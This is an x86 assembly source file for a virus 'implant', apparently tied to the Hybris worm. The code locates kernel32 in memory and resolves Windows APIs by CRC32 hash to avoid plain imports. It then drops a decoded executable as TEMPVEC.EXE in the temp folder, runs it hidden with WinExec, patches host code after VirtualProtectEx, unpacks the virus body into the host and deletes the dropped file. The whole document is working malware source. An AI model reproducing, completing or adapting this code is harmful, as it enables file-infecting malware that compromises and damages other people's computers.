BITS 32

_PFLAG_  equ 10000000000000000000000000000000b
_EAX_    equ 00000001b
_ECX_    equ 00000010b
_EDX_    equ 00000100b
_EBX_    equ 00001000b
_ESP_    equ 00010000b
_EBP_    equ 00100000b
_ESI_    equ 01000000b
_EDI_    equ 10000000b
_FREE_   equ 00010000b
_NONE_   equ 10000000000000000000000011101111b


CRC_POLY     equ 0EDB88320h
CRC_INIT     equ 0FFFFFFFFh

diff         equ 0                                    ;stack varz
_createfile  equ 4
_writefile   equ 8
_closehandle equ 12
_winexec     equ 16
_gettemppath equ 20
_globalalloc equ 24
_globalfree  equ 28
_virtualprot equ 32
_deletefile  equ 36
_fname       equ 40

_stack_size  equ 296

implant:
       sub dword [esp], byte 5
       pushad

     XOR EBP, _FREE_
       sub esp, _stack_size

     XOR EBP, _EDX_
       mov edx, [esp+(8*4)+_stack_size+4]
       call .seh
     XOR EBP, _FREE_
       mov esp, [esp+8]
     XOR EBP, _NONE_
       popad
       jmp near .retry
     XOR EBP, _EDX_
  .seh:
       push dword [fs:0]
       mov dword [fs:0], esp
  .retry:
       dec edx
       pushad
     XOR EBP, _EDX_+_ECX_+_PFLAG_
       mov ecx, [edx+3ch]
       cmp word [edx], "MZ"
       jne near .retry2
       cmp ecx, 400h
       jbe near .check
       sub ecx, ecx
  .check:
       cmp dword [edx+ecx], "PE"
  .retry2:
       popad
       jne near .retry
     XOR EBP, _EDX_
       pop dword [fs:0]
       pop eax

     XOR EBP, _EDX_+_EAX_
       mov eax, [edx+3ch]
       add eax, edx
     XOR EBP, _EDX_+_EAX_+_ESI_
       mov esi, [eax+120]           ;get kernel32 APIs...
       lea esi, [esi+edx+24]
       lodsd
       push eax
       lodsd
       push eax
       lodsd
     XOR EBP, _EBP_+_EDX_+_EAX_+_EBX_+_ESI_
       xchg ebx, eax
       pop ebp                                  ;ebp=RVA table
     XOR EBP, _EBP_+_EDX_+_EAX_+_EBX_+_ECX_+_ESI_
       pop ecx                                  ;ecx=number of names
       lodsd
       xchg esi, eax                            ;esi=names table
       xchg esi, ebx                            ;ebx=ordinal table
       neg edx
       sub esi, edx
       sub ebp, edx
       sub ebx, edx                            ;edx=-kernel32
     XOR EBP, _NONE_
       sub edi, edi
  .loopy:
       inc edi                                 ;edi=ordinal counter
       lodsd                                   ;eax=API name string
       pusha
       sub eax, edx
       xchg eax, esi
       mov ecx, CRC_INIT
  .next_byte:
       lodsb
       test al, al
       jz near .done
       xor cl, al
       mov al, 8
  .next_bit:
       shr ecx, 1
       jnc near .poly
       xor ecx, CRC_POLY
  .poly:
       dec al
       jnz near .next_bit
       jmp near .next_byte
  .done:
       sub eax, eax
       cmp ecx, 0AAC4A387h                       ;CreateFileA
       je near .patch_api
       inc eax
       cmp ecx, 03316A9EDh			;WriteFile
       je near .patch_api
       inc eax
       cmp ecx, 04F6CEA0Bh			;CloseHandle
       je near .patch_api
       inc eax
       cmp ecx, 0B7015EE1h			;WinExec
       je near .patch_api
       inc eax
       cmp ecx, 00C88E9BEh                      ;GetTempPathA
       je near .patch_api
       inc eax
       cmp ecx, 080438BCEh			;GlobalAlloc
       je near .patch_api
       inc eax
       cmp ecx, 09C94E162h			;GlobalFree
       je near .patch_api
       inc eax
       cmp ecx, 0A2E7FBECh			;VirtualProtectEx
       je near .patch_api
       inc eax
       cmp ecx, 06E649434h                      ;DeleteFileA
       jne near .end_loopy

  .patch_api:
       lea esi, [esp+(8*4)+eax*4+_createfile]
       movzx eax, word [ebx+(edi*2)]             ;get ordinal
       dec eax
       mov eax, [ebp+(eax*4)]                  ;get rva
       sub eax, edx
       mov [esi], eax                          ;got it!
  .end_loopy:
       popa
       dec ecx
       jnz near .loopy                            ;all APIs scanned

     XOR EBP, _EDI_
  addon_size equ $
       mov edi, 12345678h               ;***
       push edi
       push byte 40h
     XOR EBP, _EDI_+_EAX_
       call [esp+_globalalloc+8]
     XOR EBP, _EDI_+_ECX_+_EAX_
       mov ecx, edi
       mov edi, eax
     XOR EBP, _EDI_+_ECX_+_ESI_+_EAX_
  base_virus equ $
       mov esi, 12345678h               ;***
       rep movsb
     XOR EBP, _EAX_
  jmp2high equ $
       add eax, high_entry-implant     ;***internal
       jmp eax

     XOR EBP, _ESI_
  high_entry:
       lea esi, [esp+_fname]
       push esi
       push dword 100h
     XOR EBP, _ESI_+_EAX_
       call [esp+_gettemppath+8]
     XOR EBP, _ESI_+_EAX_+_EDI_
       lea edi, [esi+eax]
       mov eax, "TEMP"
       stosd
       add eax, "VEC."-"TEMP"
       stosd
       add eax, "EXE"-"VEC."
       stosd

       push byte 0
       push dword 80h
       push byte 2              ;CREATE_ALWAYS
       push byte 0
       push byte 0
       push dword 40000000h     ;GENERIC_WRITE
       push esi
       call [esp+_createfile+7*4]
     XOR EBP, _ESI_+_EAX_+_ECX_+_PFLAG_
       mov ecx, eax
       inc eax
       jz near .no_drop

     XOR EBP, _ESI_+_ECX_
       push ecx

       push byte 0
     XOR EBP, _ESI_+_ECX_+_EDX_
       mov edx, esp

       push byte 0
       push edx

     XOR EBP, _ESI_+_ECX_+_EDX_+_EAX_
  unpackedsize equ $
       mov eax, dword 12345678h         ;***
       push eax
       push eax
       push ecx

       push eax
       push byte 40h
     XOR EBP, _ESI_+_EDI_+_EAX_
       call [esp+_globalalloc+9*4]
       xchg edi, eax
       mov [esp+4], edi
     XOR EBP, _ESI_+_EDI_
       push edi
  base_packedhybris equ $
       push dword 1234567h                ;***
       call z_decode
       call [esp+_writefile+7*4]
       mov [esp], edi
     XOR EBP, _ESI_
       call [esp+_globalfree+8]
       call [esp+_closehandle+4]
%ifndef DEBUG
       push byte 0
%else
       push byte 5
%endif
       push esi
     XOR EBP, _FREE_
       call [esp+_winexec+2*4]

  .no_drop:
       push byte 0
       push esp
       push byte 00000040h      ;PAGE_EXECUTE_READWRITE
  host_codesize equ $
       push dword 12345678h     ;***
  base_host equ $
       push dword 12345678h     ;***
       push dword 7fffffffh
       call [esp+_virtualprot+6*4]

     XOR EBP, _EDI_
       mov edi, [esp+8*4+_stack_size+4]
     XOR EBP, _EDI_+_EAX_
  dword1 equ $
       mov eax, 12345678h           ;***
       stosd
  dword2 equ $
       mov eax, 12345678h           ;***
       stosd                            ;restore code

       db 0cch

     XOR EBP, _FREE_
  internal1 equ $
       push dword [host_codesize]           ;***internal
       push byte 40h
     XOR EBP, _EAX_
       call [esp+_globalalloc+8+4]
     XOR EBP, _EAX_+_ESI_
       xchg esi, eax
     XOR EBP, _ESI_
       push esi
       push esi
     XOR EBP, _EDI_+_ESI_
  base_packed_body equ $
       mov edi, 12345678h               ;***
       push edi
     XOR EBP, _ESI_
       call z_decode
     XOR EBP, _ESI_+_ECX_+_EDI_
       mov ecx, [edi+4]
  internal2 equ $
       mov edi, [base_host]            ;***internal
       rep movsb
     XOR EBP, _FREE_
       call [esp+_globalfree+4+4]
     XOR EBP, _EAX_
       pop eax
       push byte 0
       push esp
       push eax
     XOR EBP, _FREE_
  internal3 equ $
       push dword [host_codesize]      ;***internal
  internal4 equ $
       push dword [base_host]          ;***internal
       push dword 7fffffffh
       call [esp+_virtualprot+6*4]
       pop eax
     XOR EBP, _EAX_
       lea eax, [esp+_fname]
       push eax
     XOR EBP, _FREE_
       call [esp+_deletefile+4]
       add esp, _stack_size
     XOR EBP, _NONE_
       popad
       ret

%include "z_decode.inc"

implant_end:

implant_size equ $-implant

